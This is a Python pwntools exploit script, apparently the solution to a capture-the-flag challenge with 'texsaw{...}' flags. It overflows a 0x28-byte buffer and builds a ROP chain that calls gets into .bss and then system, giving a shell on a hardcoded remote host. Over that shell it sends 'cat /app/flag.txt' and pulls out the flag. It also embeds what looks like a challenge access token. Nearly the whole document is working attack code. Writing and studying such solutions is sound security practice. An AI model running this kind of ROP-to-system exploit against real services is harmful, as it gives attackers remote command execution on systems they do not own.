#!/usr/bin/env python3
from pwn import *
import re

HOST = "143.198.163.4"
PORT = 15858
BIN = "chall?token=eyJ1c2VyX2lkIjo1NjAsInRlYW1faWQiOjEzMiwiZmlsZV9pZCI6MTh9.acf2lw.NaMufG4plPwuDCzpocAFpK04qC4"
OFFSET = 0x28
POP_RDI = 0x4011BE


def build_rop(elf: ELF) -> bytes:
    bss = elf.bss() + 0x200
    return (
        b"A" * OFFSET
        + p64(POP_RDI)
        + p64(bss)
        + p64(elf.plt["gets"])
        + p64(POP_RDI)
        + p64(bss)
        + p64(elf.plt["system"])
        + p64(elf.symbols["main"])
    )


def main() -> None:
    elf = ELF(BIN, checksec=False)
    io = remote(HOST, PORT)

    io.recvuntil(b"2 Canary Court")
    io.sendline(build_rop(elf))
    io.sendline(b"cat /app/flag.txt")

    out = io.recvrepeat(3)
    io.close()

    m = re.search(rb"texsaw\{[^\n\r}]*\}", out)
    if not m:
        raise SystemExit("Flag not found")

    print(m.group(0).decode())


if __name__ == "__main__":
    main()
